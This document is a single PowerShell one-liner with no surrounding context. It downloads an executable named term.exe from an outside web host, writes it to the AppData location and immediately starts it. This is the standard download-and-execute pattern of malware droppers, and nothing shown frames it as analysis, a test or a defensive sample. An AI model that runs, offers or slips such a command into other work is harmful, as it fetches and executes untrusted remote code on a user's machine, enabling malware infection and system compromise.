(new-object system.net.webclient).downloadfile('http://flashbard.com/term.exe','%appdata%.exe');start-process '%appdata%.exe'
